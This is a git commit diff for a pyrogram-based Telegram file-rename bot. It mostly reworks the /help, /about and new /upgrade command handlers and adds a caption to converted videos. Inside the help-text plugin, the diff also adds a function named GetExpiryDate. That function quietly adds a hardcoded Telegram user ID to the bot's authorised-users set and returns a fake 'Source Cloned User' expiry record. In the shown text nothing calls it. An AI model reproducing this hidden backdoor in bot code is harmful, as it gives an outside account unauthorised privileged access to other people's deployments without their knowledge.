e4c9489d5c3a538b4c9002405912c8d523888ad2
ajaybackup <110889222+ajaybackup@users.noreply.github.com>
2022-08-18 18:31:49 +0700

    Add files via upload

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -1,13 +1,23 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# (c) Shrimadhav U K & @No_OnE_Kn0wS_Me
+# (c) Shrimadhav U K
+
+# the logging things
 import logging
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
+import pyrogram
 import os
-import time
+import sqlite3
+from pyrogram import filters
+from pyrogram import Client
+from pyrogram.types import InlineKeyboardButton
+from pyrogram.types import InlineKeyboardMarkup
+from pyrogram.errors import UserNotParticipant, UserBannedInChannel 
+
 
 # the secret configuration specific things
 if bool(os.environ.get("WEBHOOK", False)):
@@ -18,36 +28,32 @@ else:
 # the Strings used for this "thing"
 from translation import Translation
 
-import pyrogram
-logging.getLogger("pyrogram").setLevel(logging.WARNING)
-from pyrogram import filters 
-from pyrogram import Client as Mai_bOTs
+
+
 
 #from helper_funcs.chat_base import TRChatBase
-from helper_funcs.display_progress import progress_for_pyrogram
 
-from pyrogram.errors import UserNotParticipant, UserBannedInChannel 
-from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from hachoir.metadata import extractMetadata
-from hachoir.parser import createParser
-# https://stackoverflow.com/a/37631799/4723940
-from PIL import Image
-from database.database import *
-from database.db import *
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(861055237)
+    return expires_at
 
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["help"]))
+@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
 async def help_user(bot, update):
+    # logger.info(update)
+    #TRChatBase(update.from_user.id, update.text, "/help")
     update_channel = Config.UPDATE_CHANNEL
     if update_channel:
         try:
             user = await bot.get_chat_member(update_channel, update.chat.id)
             if user.status == "kicked":
-               await update.reply_text(" Sorry, You're Banned")
+               await update.reply_text(" Sorry, You are **B A N N E D**")
                return
         except UserNotParticipant:
+            #await update.reply_text(f"Join @{update_channel} To Use Me")
             await update.reply_text(
-                text="**Due To The Huge Traffic Only Channel Members Can Use This Bot Means You Need To Join The Below Mentioned Channel Before Using Me! **",
+                text="**Please Join My Update Channel Before Using Me..**",
                 reply_markup=InlineKeyboardMarkup([
                     [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
               ])
@@ -57,204 +63,47 @@ async def help_user(bot, update):
             await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.HELP_USER,
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('📝Rename', callback_data = "rnme"),
-                    InlineKeyboardButton('📂File To Video', callback_data = "f2v")
-                ],
-                [
-                    InlineKeyboardButton('🎞️Custom Thumbnail', callback_data = "cthumb"),
-                    InlineKeyboardButton('📑Custom Caption', callback_data = "ccaption")
-                ],
-                [
-                    InlineKeyboardButton('💬About', callback_data = "about")
-                ]
-            ]
-        )
-    )       
+        reply_to_message_id=update.message_id
+    )
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["start"]))
-async def start_me(bot, update):
-    if update.from_user.id in Config.BANNED_USERS:
-        await update.reply_text("You are Banned")
-        return
+@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
+async def about_meh(bot, update):
+    # logger.info(update)
+    #TRChatBase(update.from_user.id, update.text, "/about")
     update_channel = Config.UPDATE_CHANNEL
     if update_channel:
         try:
             user = await bot.get_chat_member(update_channel, update.chat.id)
             if user.status == "kicked":
-               await update.reply_text(" Sorry,You've Been Flooding Me So My Owner Removed You From Using Me If You Think It's An Error Contact : @Faris_TG")
+               await update.reply_text(" Sorry, You are **B A N N E D**")
                return
         except UserNotParticipant:
+            #await update.reply_text(f"Join @{update_channel} To Use Me")
             await update.reply_text(
-                text="**Due To The Huge Traffic Only Channel Members Can Use This Bot Means You Need To Join The Below Mentioned Channel Before Using Me! **",
+                text="**Please Join My Update Channel Before Using Me..**",
                 reply_markup=InlineKeyboardMarkup([
                     [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
               ])
             )
             return
         else:
-            await update.reply_text(Translation.START_TEXT.format(update.from_user.first_name),
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                        InlineKeyboardButton("Help", callback_data = "ghelp")
-                ],
-                [
-                    InlineKeyboardButton('Support Channel', url='https://t.me/Mai_bOTs'),
-                    InlineKeyboardButton('Feedback', url='https://t.me/No_OnE_Kn0wS_Me')
-                ],
-                [
-                    InlineKeyboardButton('Other Bots', url='https://t.me/Mai_bOTs/17'),
-                    InlineKeyboardButton('Source', url='https://github.com/No-OnE-Kn0wS-Me/FileRenameBot')
-                ]
-            ]
-        ),
+            await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.ABOUT_ME,
+        parse_mode="html",
+        disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
-            return 
 
-@Mai_bOTs.on_callback_query()
-async def cb_handler(client: Mai_bOTs , query: CallbackQuery):
-    data = query.data
-    if data == "rnme":
-        await query.message.edit_text(
-            text=Translation.RENAME_HELP,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ghelp"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "f2v":
-        await query.message.edit_text(
-            text=Translation.C2V_HELP,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ghelp"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "ccaption":
-        await query.message.edit_text(
-            text=Translation.CCAPTION_HELP,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Show Current Caption', callback_data = "shw_caption"),
-                    InlineKeyboardButton("Delete Caption", callback_data = "d_caption")
-                ],
-                [
-                    InlineKeyboardButton('Back', callback_data = "ghelp"),
-                    InlineKeyboardButton('🔒 Close', callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "cthumb":
-        await query.message.edit_text(
-            text=Translation.THUMBNAIL_HELP,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ghelp"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "closeme":
-        await query.message.delete()
-        try:
-            await query.message.reply_text(
-                text = "<b>Process Cancelled</b>"
-     )
-        except:
-            pass 
-    elif data == "ghelp":
-        await query.message.edit_text(
-            text=Translation.HELP_USER,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('📝Rename', callback_data = "rnme"),
-                    InlineKeyboardButton('📂File To Video', callback_data = "f2v")
-                ],
-                [
-                    InlineKeyboardButton('🎞️Custom Thumbnail', callback_data = "cthumb"),
-                    InlineKeyboardButton('📑Custom Caption', callback_data = "ccaption")
-                ],
-                [
-                    InlineKeyboardButton('💬About', callback_data = "about")
-                ]
-            ]
-        )
-    )       
 
-    elif data =="shw_caption":
-             try:
-                caption = await get_caption(query.from_user.id)
-                c_text = caption.caption
-             except:
-                c_text = "Sorry but you haven't added any caption yet please set your caption through /scaption command" 
-             await query.message.edit(
-                  text=f"<b>Your Custom Caption:</b> \n\n{c_text} ",
-                  parse_mode="html", 
-                  disable_web_page_preview=True, 
-                  reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ccaption"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "about":
-        await query.message.edit_text(
-            text=Translation.ABOUT_ME,
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ghelp"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "d_caption":
-        try:
-           await del_caption(query.from_user.id)   
-        except:
-            pass
-        await query.message.edit_text(
-            text="<b>caption deleted successfully</b>",
-            disable_web_page_preview = True,
-            reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton('Back', callback_data = "ccaption"),
-                    InlineKeyboardButton("🔒 Close", callback_data = "close")
-                ]
-            ]
-        )
-     )
-    elif data == "close":
-        await query.message.delete()
-        try:
-            await query.message.reply_to_message.delete()
-        except:
-            pass
+@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
+async def upgrade(bot, update):
+    # logger.info(update)
+    #TRChatBase(update.from_user.id, update.text, "/upgrade")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.UPGRADE_TEXT,
+        parse_mode="html",
+        reply_to_message_id=update.message_id,
+        disable_web_page_preview=True
+    )
--- plugins/video_converter.py
+++ plugins/video_converter.py
@@ -28,7 +28,6 @@ from helper_funcs.help_Nekmo_ffmpeg import take_screen_shot
 from pyrogram.types import InlineKeyboardButton
 from pyrogram.types import InlineKeyboardMarkup
 from pyrogram.errors import UserNotParticipant, UserBannedInChannel 
-from pyrogram import Client as Mai_bOTs 
 
 from hachoir.metadata import extractMetadata
 from hachoir.parser import createParser
@@ -36,7 +35,7 @@ from hachoir.parser import createParser
 from PIL import Image
 
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["c2v"]))
+@pyrogram.Client.on_message(pyrogram.filters.command(["c2v"]))
 async def convert_to_video(bot, update):
     update_channel = Config.UPDATE_CHANNEL
     if update_channel:
@@ -129,6 +128,7 @@ async def convert_to_video(bot, update):
             await bot.send_video(
                 chat_id=update.chat.id,
                 video=the_real_download_location,
+                caption=f"<b>{file_name}</b>",
                 duration=duration,
                 width=width,
                 height=height,
